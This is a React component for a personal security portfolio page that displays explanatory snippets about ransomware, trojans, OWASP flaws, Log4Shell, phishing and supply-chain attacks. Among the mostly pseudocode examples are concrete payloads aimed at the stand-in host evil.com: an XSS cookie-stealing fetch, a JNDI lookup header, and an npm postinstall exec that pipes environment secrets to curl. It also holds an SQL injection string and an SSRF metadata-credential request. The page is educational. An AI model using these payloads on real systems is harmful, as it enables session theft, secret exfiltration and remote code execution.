"use client"

import { ScrollReveal } from "./scroll-reveal"
import { useState } from "react"
import { Shield, AlertTriangle, Bug, Lock, Eye, Zap, FileWarning, Database, Globe } from "lucide-react"

const threats = [
  {
    category: "Ransomware",
    icon: Lock,
    color: "text-red-400",
    borderColor: "hover:border-red-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(0_70%_50%/0.08)]",
    description: "Ransomware encrypts victim files and demands payment for decryption keys. Modern variants use double extortion -- encrypting data while also exfiltrating it to threaten public leaks.",
    variants: ["WannaCry", "LockBit", "REvil", "Conti", "BlackCat"],
    code: `# Simplified ransomware flow
def ransomware_lifecycle():
    # 1. Initial Access (phishing / RDP)
    payload = deliver_payload(vector="email")
    
    # 2. Privilege Escalation
    elevate_privileges(method="CVE-2024-XXXX")
    
    # 3. Lateral Movement
    spread(protocol="SMB", network="internal")
    
    # 4. Data Exfiltration (double extortion)
    exfil_data(target="c2_server", encrypt=True)
    
    # 5. Encryption & Ransom Note
    encrypt_files(algo="AES-256-CBC")
    drop_ransom_note(btc_wallet="bc1q...")`,
  },
  {
    category: "Trojans",
    icon: Bug,
    color: "text-orange-400",
    borderColor: "hover:border-orange-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(30_70%_50%/0.08)]",
    description: "Trojans disguise themselves as legitimate software to infiltrate systems. They can create backdoors, steal credentials, log keystrokes, and give attackers persistent remote access.",
    variants: ["Emotet", "TrickBot", "Agent Tesla", "Remcos RAT", "AsyncRAT"],
    code: `// Trojan evasion techniques
class TrojanAnalysis {
  // 1. Process Injection
  hollowProcess(target: "svchost.exe") {
    suspend(target) → unmap(memory)
    write(malicious_code) → resume()
  }
  
  // 2. Anti-Sandbox Detection
  detectSandbox() {
    check(cpuCores < 2)      // VM detection
    check(ram < 4GB)          // Resource check
    check(mouseMovement == 0) // Human check
    sleep(300000)             // Delayed exec
  }
  
  // 3. Persistence via Registry
  persist() {
    reg.add("HKCU\\...\\Run", payload_path)
  }
}`,
  },
  {
    category: "OWASP Top 10",
    icon: Shield,
    color: "text-primary",
    borderColor: "hover:border-primary/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(162_78%_48%/0.08)]",
    description: "The OWASP Top 10 represents the most critical web application security risks. Understanding each vector is essential for building software that resists real-world attacks.",
    variants: ["Injection", "Broken Auth", "XSS", "SSRF", "Security Misconfiguration"],
    code: `-- SQL Injection: The Classic Attack
-- Vulnerable query:
SELECT * FROM users 
WHERE username = '' OR 1=1 --' 
AND password = 'anything';

-- XSS: Stored Cross-Site Scripting
<script>
  fetch('https://evil.com/steal?cookie='
    + document.cookie)
</script>

-- SSRF: Server-Side Request Forgery
GET /api/fetch?url=http://169.254.169.254
  /latest/meta-data/iam/credentials

-- The fix: parameterized queries, CSP 
-- headers, input validation, allowlists`,
  },
  {
    category: "Zero-Day Exploits",
    icon: Zap,
    color: "text-yellow-400",
    borderColor: "hover:border-yellow-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(45_70%_50%/0.08)]",
    description: "Zero-day exploits target unknown vulnerabilities before patches exist. They are weaponized by APT groups and sold on underground markets for millions of dollars.",
    variants: ["Log4Shell", "EternalBlue", "Heartbleed", "Shellshock", "ProxyLogon"],
    code: `# Log4Shell (CVE-2021-44228) - The exploit
# that shook the internet

# Attack payload in HTTP header:
User-Agent: \${jndi:ldap://evil.com/a}

# What happens:
# 1. Log4j processes the string
# 2. JNDI lookup contacts attacker LDAP
# 3. Malicious Java class is loaded
# 4. Remote Code Execution achieved

# Impact: CVSS 10.0 - Maximum severity
# Affected: ~35,000 Java packages
# Time to patch: Organizations scrambled
#   for weeks while attacks surged`,
  },
  {
    category: "Social Engineering",
    icon: Eye,
    color: "text-purple-400",
    borderColor: "hover:border-purple-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(270_70%_50%/0.08)]",
    description: "Social engineering exploits human psychology rather than technical flaws. Phishing, pretexting, and baiting remain the most effective initial access vectors in modern attacks.",
    variants: ["Spear Phishing", "Vishing", "Baiting", "Pretexting", "Watering Hole"],
    code: `# Phishing attack anatomy
target = "cfo@company.com"

email = craft_phish(
  sender   = spoof("ceo@company.com"),
  subject  = "Urgent: Wire Transfer Needed",
  body     = clone_template("internal_memo"),
  link     = "company-secure-login.evil.com",
  urgency  = "HIGH"  # Pressure tactics
)

# Landing page clones real SSO portal
# Captures credentials + MFA tokens
# Forwards to real site (victim unaware)
# Attacker now has valid session

# Defense: Security awareness training,
# DMARC/DKIM/SPF, hardware MFA keys`,
  },
  {
    category: "Supply Chain Attacks",
    icon: Database,
    color: "text-cyan-400",
    borderColor: "hover:border-cyan-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(180_70%_50%/0.08)]",
    description: "Supply chain attacks compromise trusted software dependencies or build pipelines to distribute malware at scale. One poisoned package can affect thousands of downstream users.",
    variants: ["SolarWinds", "Codecov", "event-stream", "ua-parser-js", "PyPI Typosquatting"],
    code: `// Supply chain attack via npm package
// Malicious post-install script

{
  "name": "co1ors",  // typosquatting
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node setup.js"
  }
}

// setup.js (obfuscated payload)
const { exec } = require('child_process');
const os = require('os');

// Exfiltrate environment secrets
exec('env | curl -X POST -d @- evil.com');

// 180,000+ downloads before detection
// Defense: lockfiles, npm audit, Snyk`,
  },
]

export function ThreatSection() {
  const [activeThreat, setActiveThreat] = useState(0)
  const active = threats[activeThreat]
  const ActiveIcon = active.icon

  return (
    <section id="threats" className="relative py-32 px-6">
      <div className="mx-auto max-w-6xl">
        <ScrollReveal>
          <div className="mb-4 flex items-center gap-3">
            <div className="h-px flex-1 bg-border" />
            <span className="font-mono text-xs text-primary tracking-widest uppercase">
              {"// Threat Landscape"}
            </span>
            <div className="h-px flex-1 bg-border" />
          </div>
          <h2 className="text-center text-3xl md:text-4xl font-bold text-foreground mt-6 mb-4 text-balance">
            The Stuff That Keeps Me Up at Night
          </h2>
          <p className="text-center text-muted-foreground text-sm max-w-lg mx-auto mb-16 leading-relaxed">
            Attack vectors, malware families, and the techniques behind them.
            This is what I spend my free time reading about and pulling apart.
          </p>
        </ScrollReveal>

        {/* Threat category selector */}
        <ScrollReveal delay={100}>
          <div className="flex flex-wrap justify-center gap-2 mb-12">
            {threats.map((threat, i) => {
              const Icon = threat.icon
              return (
                <button
                  key={threat.category}
                  onClick={() => setActiveThreat(i)}
                  className={`inline-flex items-center gap-2 rounded-lg border px-4 py-2.5 font-mono text-xs tracking-wide transition-all duration-300 ${
                    activeThreat === i
                      ? "border-primary bg-primary/10 text-primary shadow-[0_0_20px_hsl(162_78%_48%/0.1)]"
                      : "border-border bg-card text-muted-foreground hover:border-primary/30 hover:text-foreground"
                  }`}
                >
                  <Icon className="h-3.5 w-3.5" />
                  {threat.category}
                </button>
              )
            })}
          </div>
        </ScrollReveal>

        {/* Active threat display */}
        <ScrollReveal delay={200}>
          <div className="grid lg:grid-cols-2 gap-6">
            {/* Info card */}
            <div className={`rounded-lg border border-border bg-card p-6 transition-all duration-300 ${active.borderColor} ${active.glowColor}`}>
              <div className="flex items-center gap-3 mb-4">
                <ActiveIcon className={`h-6 w-6 ${active.color}`} />
                <h3 className="text-xl font-bold text-foreground">{active.category}</h3>
              </div>
              <p className="text-sm text-muted-foreground leading-relaxed mb-6">
                {active.description}
              </p>
              <div>
                <h4 className="font-mono text-xs text-primary tracking-widest uppercase mb-3 flex items-center gap-2">
                  <AlertTriangle className="h-3 w-3" />
                  Known Variants & Examples
                </h4>
                <div className="flex flex-wrap gap-2">
                  {active.variants.map((v) => (
                    <span
                      key={v}
                      className={`inline-block rounded-md border border-border bg-secondary px-3 py-1.5 font-mono text-[11px] text-secondary-foreground`}
                    >
                      {v}
                    </span>
                  ))}
                </div>
              </div>

              {/* Threat severity indicator */}
              <div className="mt-6 pt-6 border-t border-border">
                <div className="flex items-center justify-between mb-2">
                  <span className="font-mono text-xs text-muted-foreground">Threat Severity</span>
                  <span className={`font-mono text-xs font-bold ${active.color}`}>CRITICAL</span>
                </div>
                <div className="h-1.5 w-full rounded-full bg-secondary overflow-hidden">
                  <div
                    className="h-full rounded-full transition-all duration-700 ease-out"
                    style={{
                      width: "92%",
                      background: `linear-gradient(90deg, hsl(162, 78%, 48%), hsl(0, 70%, 50%))`,
                      boxShadow: "0 0 8px hsl(0 70% 50% / 0.4)",
                    }}
                  />
                </div>
              </div>
            </div>

            {/* Code terminal */}
            <div className="rounded-lg border border-border bg-card overflow-hidden transition-all duration-300">
              <div className="flex items-center gap-2 border-b border-border px-4 py-3 bg-secondary/50">
                <span className="h-2.5 w-2.5 rounded-full bg-destructive/70" />
                <span className="h-2.5 w-2.5 rounded-full bg-yellow-500/70" />
                <span className="h-2.5 w-2.5 rounded-full bg-green-500/70" />
                <span className="ml-3 font-mono text-[10px] text-muted-foreground tracking-wider">
                  {active.category.toLowerCase().replace(/\s+/g, "_")}_analysis.py
                </span>
              </div>
              <div className="p-5 overflow-x-auto">
                <pre className="font-mono text-[11px] leading-relaxed text-muted-foreground whitespace-pre">
                  {active.code.split("\n").map((line, li) => {
                    const isComment = line.trimStart().startsWith("#") || line.trimStart().startsWith("//") || line.trimStart().startsWith("--")
                    const hasKeyword = /\b(def|class|import|from|return|if|else|for|const|let|var|function|SELECT|FROM|WHERE|AND|GET|POST)\b/.test(line)
                    const hasString = /(["'`])(?:(?=(\\?))\2.)*?\1/.test(line)
                    return (
                      <span key={li} className="block">
                        <span className="inline-block w-6 text-right mr-4 text-muted-foreground/30 select-none">{li + 1}</span>
                        <span className={
                          isComment ? "text-muted-foreground/50 italic" :
                          hasKeyword ? "text-primary" :
                          hasString ? "text-foreground/80" :
                          "text-foreground/70"
                        }>
                          {line}
                        </span>
                      </span>
                    )
                  })}
                </pre>
              </div>
            </div>
          </div>
        </ScrollReveal>
      </div>
    </section>
  )
}
